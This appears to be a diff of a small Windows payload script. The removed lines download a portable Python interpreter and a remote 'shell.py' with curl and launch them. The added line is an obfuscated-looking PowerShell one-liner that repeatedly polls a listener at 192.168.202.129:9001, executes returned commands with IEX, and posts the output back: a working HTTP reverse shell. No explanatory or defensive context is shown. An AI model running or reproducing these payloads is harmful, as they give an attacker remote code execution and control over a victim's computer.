@@ -1,6 +1,1 @@
-curl.exe -o C:\temp\python.exe https://github.com/winpython/winpython/releases/download/5.3.20221233/Winpython64-3.10.9.0.exe
-curl.exe -o C:\temp\shell.py https://raw.githubusercontent.com/mrLeonTheMaster/shell/main/shell.py
-
-start C:\temp\python.exe C:\temp\shell.py
-
-exit
+powershell $s='192.168.202.129:9001';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
